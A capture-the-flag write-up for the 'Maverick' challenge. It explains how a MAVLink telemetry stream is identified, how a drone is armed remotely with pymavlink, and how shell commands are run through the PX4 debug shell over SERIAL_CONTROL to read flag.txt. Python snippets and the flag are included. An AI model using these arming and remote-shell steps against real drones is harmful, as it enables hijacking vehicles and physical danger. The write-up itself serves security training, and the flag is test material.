# Maverick CTF Writeup

Here is the step-by-step write-up on how the flag was found:

### Challenge Analysis
1. **Initial Connection**: Connecting to the provided endpoint (`nc exp.cybergame.sk 7030`) returns unreadable binary data.
2. **Protocol Identification**: Looking at the raw bytes and the context of the challenge ("hack Maverick as he flies by"), the data stream appears to be **MAVLink**, a lightweight messaging protocol commonly used for communicating with drones and autopilots (like ArduPilot and PX4).
3. **Connecting via Pymavlink**: To parse and interact with the stream, `pymavlink` library was installed and a Python script was written to connect to the TCP stream and listen to the incoming packets.

### Uncovering the Vulnerability
4. **Analyzing Telemetry**: Once connected, the script receives standard telemetry such as `HEARTBEAT`, `ATTITUDE`, `SYS_STATUS`, etc. Crucially, a recurring `STATUSTEXT` message was noticed:
   `STATUSTEXT {severity : 6, text : Preflight: debug serial bridge disabled until vehicle is armed}`
5. **Arming the Drone**: The debug serial bridge is a feature in PX4/ArduPilot that allows interacting with a system shell over MAVLink, but it requires the vehicle to be armed. A `MAV_CMD_COMPONENT_ARM_DISARM` command was sent to arm the drone:
   ```python
   master.mav.command_long_send(
       master.target_system, master.target_component,
       mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0, 1, 0, 0, 0, 0, 0, 0)
   ```
6. **Confirmation**: Immediately after arming the drone, a new `STATUSTEXT` arrived:
   `STATUSTEXT {severity : 6, text : Vehicle armed; debug serial bridge is now available}`

### Exploiting the Debug Shell
7. **Using SERIAL_CONTROL**: The debug bridge works via the `SERIAL_CONTROL` MAVLink message (ID 126). This message allows sending arbitrary bytes to a specific serial device on the flight controller and reading the responses.
8. **Sending Shell Commands**: A `SERIAL_CONTROL` packet was crafted to execute the `ls` command and requested a response:
   ```python
   def send_cmd(cmd):
       data = list(cmd.encode('utf-8') + b'\n')
       data += [0] * (70 - len(data)) # Pad the 70-byte array
       master.mav.serial_control_send(
           0, # device 0
           mavutil.mavlink.SERIAL_CONTROL_FLAG_EXCLUSIVE | mavutil.mavlink.SERIAL_CONTROL_FLAG_RESPOND,
           1000, 0, len(cmd)+1, data
       )
   send_cmd("ls")
   ```
9. **Finding the Flag**: The response from the `ls` command revealed a virtual filesystem containing a file named `flag.txt`:
   ```text
   PX4 debug shell over MAVLink SERIAL_CONTROL
   Type 'help' for commands.
   dvd-shell$ flag.txt
   etc
   home
   proc
   dvd-shell$
   ```
10. **Extracting the Flag**: The payload was modified to execute `cat flag.txt`. The drone responded with the contents of the file, returning the flag:

**Flag:** `SK-CERT{d3bu6_my_fly1ng_m4ch1n3}`
